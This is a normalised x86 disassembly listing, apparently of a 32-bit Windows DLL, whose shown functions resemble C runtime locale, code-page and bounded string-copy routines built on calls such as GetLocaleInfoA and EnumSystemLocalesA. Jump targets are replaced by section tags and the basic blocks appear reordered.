jmp r-xdata
push esi
call sub_10013d02
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_1000bf59
push [ ebx + 0xbc ]
call sub_1000bf59
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000bf59
push [ ebp - 0x8 ]
call sub_1000bf59
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10013f11
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
push esi
call sub_1000bf59
pop ecx
sub_10013f9f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_10011a2a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_100119e5
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_1000bf59
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_100119e5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_1000bf59
push [ ebp - 0x8 ]
call sub_1000bf59
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_10013f11
push ebx
call sub_1000bf59
push [ ebp - 0x8 ]
call sub_1000bf59
push [ ebp - 0x4 ]
call sub_1000bf59
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_1000bf59
push [ esi + 0xb0 ]
call sub_1000bf59
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10014265
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_100119e5
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_10011a2a
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_10011a2a
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_10011a2a
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_10011a2a
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_10019878
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_1000bf59
push [ ebp - 0x1c ]
call sub_1000bf59
push [ ebp - 0x20 ]
call sub_1000bf59
push [ ebp - 0x28 ]
call sub_1000bf59
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_1000bf59
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_100167e9
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_10017724
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_10017724
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_1000ac80
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_1000ac80
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_1000ac80
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000bf59
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000bf59
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000bf59
push [ esi + 0xc0 ]
call sub_1000bf59
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_1001460a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1000bf59
pop ecx
sub_1001462a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1000e8db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
sub_100146a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_100146e6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1000e8db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001479b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1000e8db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
sub_10014803
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_10014865
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_100123b0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
push r--data
push esi
call sub_100123b0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_1001a27c
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_10014909
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001492d
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_10014961
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1001497c
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1000e343
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001492d
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_10014909
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_10014a14
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_1001492d
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_10014961
push esi
mov edi eax
call sub_1000b9b0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_10014a88
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1000e343
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001492d
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a1f7
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a384
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_1000b9b0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_10014909
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_1000b9b0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_10014a14
pop ecx
pop ecx
test eax eax
je r-xdata
sub_10014c5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1000e343
mov esi eax
mov edx edi
add esi 0x9c
call sub_1001492d
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_10014a14
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_10014d1b
push [ esi ]
call sub_1000b9b0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_1000b9b0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_10014961
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_10014a88
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_10014d82
push [ esi ]
call sub_1000b9b0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_10014961
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_10014c5a
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_10014dbe
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1000e343
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_10014803
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
